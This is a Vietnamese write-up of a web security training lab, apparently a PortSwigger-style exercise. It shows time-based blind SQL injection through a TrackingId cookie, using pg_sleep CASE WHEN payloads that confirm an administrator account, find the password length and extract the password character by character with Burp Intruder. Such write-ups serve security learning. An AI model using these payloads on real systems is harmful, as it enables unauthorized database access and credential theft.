# Blind SQL injection with time delays and information retrieval

Bài lab này yêu cầu ta khai thác thông tin dữ liệu của quản trị viên với lỗ hổng Blind SQL Injection Time Delays.

Ném vào Burp và ta thấy có phần TrackingID có thể thay đổi được bên trong Cookie

![](https://cdn.discordapp.com/attachments/1124588087931043891/1137246879382519879/image.png)

Ta thử thay đổi TrackingID :
- `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
- `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

Ở điều kiện 1=1(True) thì xuất hiện độ trễ khi nhận về response còn ở điều kiện 1=2(False) thì không xuất hiện độ trễ, ta sẽ lợi dụng lỗ hổng này để kiểm tra từng kí tự mật khẩu của administrator.
Ta sẽ kiểm tra xem có tài khoản `administrator` không :
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
Ta thấy độ trễ khi trả về response nên có tài khoản administrator.
Tiếp theo ta kiểm tra xem có bao nhiêu kí tự bên trong password :
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
...
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`( tới đây thì response trả về rất nhanh, vậy là chỉ có 20 kí tự trong password)

Tiếp theo ta kiểm tra từng kí tự của password:
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Ném vào Intruder và brute force, nếu thấy trường hợp nào xuất hiện độ trễ thì đó là 1 phần của `password`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1137250784766087168/image.png)

Làm tương tự với những kí tự tiếp theo và ta sẽ có password.

